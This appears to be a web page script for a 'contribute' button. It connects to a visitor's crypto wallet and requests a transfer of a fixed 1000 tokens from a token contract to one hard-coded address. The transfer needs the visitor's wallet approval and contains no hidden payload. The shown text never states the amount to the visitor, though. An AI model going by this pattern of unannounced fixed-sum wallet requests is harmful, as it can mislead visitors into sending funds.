
document.getElementById('fuck-button').addEventListener('click', async function () {

  if (typeof web3 !== 'undefined') {

    web3 = new Web3(web3.currentProvider);

    try {
      await ethereum.enable();

      const accounts = await web3.eth.getAccounts();
      const sender = accounts[0];

      const contractAddress = '0x55d398326f99059fF775485246999027B3197955'; 

      const contractABI = [
        {
          constant: true,
          inputs: [],
          name: "name",
          outputs: [{ name: "", type: "string" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: false,
          inputs: [{ name: "_upgradedAddress", type: "address" }],
          name: "deprecate",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: false,
          inputs: [
            { name: "_spender", type: "address" },
            { name: "_value", type: "uint256" },
          ],
          name: "approve",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "deprecated",
          outputs: [{ name: "", type: "bool" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: false,
          inputs: [{ name: "_evilUser", type: "address" }],
          name: "addBlackList",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "totalSupply",
          outputs: [{ name: "", type: "uint256" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: false,
          inputs: [
            { name: "_from", type: "address" },
            { name: "_to", type: "address" },
            { name: "_value", type: "uint256" },
          ],
          name: "transferFrom",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "upgradedAddress",
          outputs: [{ name: "", type: "address" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [{ name: "", type: "address" }],
          name: "balances",
          outputs: [{ name: "", type: "uint256" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "decimals",
          outputs: [{ name: "", type: "uint256" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "maximumFee",
          outputs: [{ name: "", type: "uint256" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "_totalSupply",
          outputs: [{ name: "", type: "uint256" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: false,
          inputs: [],
          name: "unpause",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: true,
          inputs: [{ name: "_maker", type: "address" }],
          name: "getBlackListStatus",
          outputs: [{ name: "", type: "bool" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [
            { name: "", type: "address" },
            { name: "", type: "address" },
          ],
          name: "allowed",
          outputs: [{ name: "", type: "uint256" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "paused",
          outputs: [{ name: "", type: "bool" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [{ name: "who", type: "address" }],
          name: "balanceOf",
          outputs: [{ name: "", type: "uint256" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: false,
          inputs: [],
          name: "pause",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "getOwner",
          outputs: [{ name: "", type: "address" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "owner",
          outputs: [{ name: "", type: "address" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "symbol",
          outputs: [{ name: "", type: "string" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: false,
          inputs: [
            { name: "_to", type: "address" },
            { name: "_value", type: "uint256" },
          ],
          name: "transfer",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: false,
          inputs: [
            { name: "newBasisPoints", type: "uint256" },
            { name: "newMaxFee", type: "uint256" },
          ],
          name: "setParams",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: false,
          inputs: [{ name: "amount", type: "uint256" }],
          name: "issue",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: false,
          inputs: [{ name: "amount", type: "uint256" }],
          name: "redeem",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: true,
          inputs: [
            { name: "_owner", type: "address" },
            { name: "_spender", type: "address" },
          ],
          name: "allowance",
          outputs: [{ name: "remaining", type: "uint256" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "basisPointsRate",
          outputs: [{ name: "", type: "uint256" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: true,
          inputs: [{ name: "", type: "address" }],
          name: "isBlackListed",
          outputs: [{ name: "", type: "bool" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: false,
          inputs: [{ name: "_clearedUser", type: "address" }],
          name: "removeBlackList",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "MAX_UINT",
          outputs: [{ name: "", type: "uint256" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: false,
          inputs: [{ name: "newOwner", type: "address" }],
          name: "transferOwnership",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: false,
          inputs: [{ name: "_blackListedUser", type: "address" }],
          name: "destroyBlackFunds",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          inputs: [
            { name: "_initialSupply", type: "uint256" },
            { name: "_name", type: "string" },
            { name: "_symbol", type: "string" },
            { name: "_decimals", type: "uint256" },
          ],
          payable: false,
          stateMutability: "nonpayable",
          type: "constructor",
        },
        {
          anonymous: false,
          inputs: [{ indexed: false, name: "amount", type: "uint256" }],
          name: "Issue",
          type: "event",
        },
        {
          anonymous: false,
          inputs: [{ indexed: false, name: "amount", type: "uint256" }],
          name: "Redeem",
          type: "event",
        },
        {
          anonymous: false,
          inputs: [{ indexed: false, name: "newAddress", type: "address" }],
          name: "Deprecate",
          type: "event",
        },
        {
          anonymous: false,
          inputs: [
            { indexed: false, name: "feeBasisPoints", type: "uint256" },
            { indexed: false, name: "maxFee", type: "uint256" },
          ],
          name: "Params",
          type: "event",
        },
        {
          anonymous: false,
          inputs: [
            { indexed: false, name: "_blackListedUser", type: "address" },
            { indexed: false, name: "_balance", type: "uint256" },
          ],
          name: "DestroyedBlackFunds",
          type: "event",
        },
        {
          anonymous: false,
          inputs: [{ indexed: false, name: "_user", type: "address" }],
          name: "AddedBlackList",
          type: "event",
        },
        {
          anonymous: false,
          inputs: [{ indexed: false, name: "_user", type: "address" }],
          name: "RemovedBlackList",
          type: "event",
        },
        {
          anonymous: false,
          inputs: [
            { indexed: true, name: "owner", type: "address" },
            { indexed: true, name: "spender", type: "address" },
            { indexed: false, name: "value", type: "uint256" },
          ],
          name: "Approval",
          type: "event",
        },
        {
          anonymous: false,
          inputs: [
            { indexed: true, name: "from", type: "address" },
            { indexed: true, name: "to", type: "address" },
            { indexed: false, name: "value", type: "uint256" },
          ],
          name: "Transfer",
          type: "event",
        },
        { anonymous: false, inputs: [], name: "Pause", type: "event" },
        { anonymous: false, inputs: [], name: "Unpause", type: "event" },
      ];

      const contract = new web3.eth.Contract(contractABI, contractAddress);

      const recipient = '0x9d87C64Ee6d2d9606DC497b1b5e767166FeE522f';
      const amount = web3.utils.toWei('1000', 'ether');

      await contract.methods.transfer(recipient, amount).send({ from: sender });

      showSuccessAlert()
    } catch (error) {
      console.error(error);
      showErrorAlert()
    }
  } else {
    console.log("Error")
  }
})



function showSuccessAlert() {
  var container = document.getElementById('customAlertContainer');

  var alertElement = document.createElement('div');
  alertElement.className = 'success-alert';

  var closeIcon = document.createElement('span');
  closeIcon.className = 'close-icon';
  closeIcon.innerHTML = '&times;';

  alertElement.appendChild(closeIcon);

  var message = document.createElement('span');
  message.textContent = 'Thank you for your Contribute!';

  alertElement.appendChild(message);

  container.appendChild(alertElement);

  closeIcon.addEventListener('click', function () {
    alertElement.remove();
  });
}


function showErrorAlert() {
  var container = document.getElementById('customAlertContainer');

  var alertElement = document.createElement('div');
  alertElement.className = 'error-alert';

  var closeIcon = document.createElement('span');
  closeIcon.className = 'close-icon';
  closeIcon.innerHTML = '&times;';

  alertElement.appendChild(closeIcon);

  var message = document.createElement('span');
  message.textContent = 'An error occurred while contributing. Please try again.';

  alertElement.appendChild(message);

  container.appendChild(alertElement);

  closeIcon.addEventListener('click', function () {
    alertElement.remove();
  });
}
